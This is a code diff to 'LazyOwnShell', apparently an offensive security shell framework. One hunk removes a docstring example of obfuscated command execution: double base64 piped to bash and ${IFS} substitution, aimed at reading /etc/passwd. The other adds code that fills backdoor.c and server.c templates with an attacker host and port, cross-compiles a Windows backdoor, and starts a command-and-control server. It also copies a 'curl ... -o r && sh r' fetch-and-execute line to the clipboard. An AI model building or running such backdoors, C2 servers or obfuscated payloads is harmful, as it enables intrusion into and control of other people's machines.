@@ -6375,15 +6375,6 @@ class LazyOwnShell(Cmd):
                 Returns:
                     list of str: A list of obfuscated command strings.
 
-                Example:
-                    >>> apply_obfuscations("cat /etc/passwd")
-                    [
-                        'echo "echo $(echo \'cat /etc/passwd\' | base64 | base64)|base64 -d|base64 -d|bash" | sed \'s/ /${IFS}/g\'',
-                        'echo {double_base64_encode(cmd)}|base64 -d|base64 -d|bash',
-                        '$(tr \'\[A-Z\]\' \'\[a-z\]\' <<< \'cat /etc/passwd\')',
-                        ...
-                    ]
-
                 Notes:
                     - Each obfuscation method aims to transform the command in a unique way.
                     - Obfuscations include encoding, character replacement, and command substitution techniques.
@@ -8664,7 +8655,8 @@ class LazyOwnShell(Cmd):
         lport = self.params["lport"]
         path = os.getcwd()
         file = f"{path}/modules/run"
-        
+        filek = f"{path}/modules/backdoor/backdoor.c"
+        files = f"{path}/modules/backdoor/server.c"
         if not check_lhost(lhost):
             return
 
@@ -8686,10 +8678,26 @@ class LazyOwnShell(Cmd):
         
         with open("sessions/r", 'w+') as f:
             f.write(content)
-        print_msg(content)
+        
         copy2clip(f"curl http://{lhost}/r -o r && sh r")
+        with open(filek, 'r') as f:
+            content = f.read()
+
+        content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
+        with open("sessions/b.c", 'w+') as f:
+            f.write(content)
+        
+        with open(files, 'r') as f:
+            content = f.read()
+
+        content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
+        with open("sessions/server.c", 'w+') as f:
+            f.write(content)
+
         choice = input(f"    {CYAN}[?] start C2 Server ? (yes/no): ")
         if choice == 'yes':
+            command = "cp modules/backdoor/*.h sessions && cd sessions && x86_64-w64-mingw32-gcc -o b.exe b.c -lwininet -lwsock32 && gcc -o server server.c && cd .."
+            os.system(command)
             os.system(server)
             print_warn(f"Shutdown Server C&C at port:{RED} {lport}")
         return
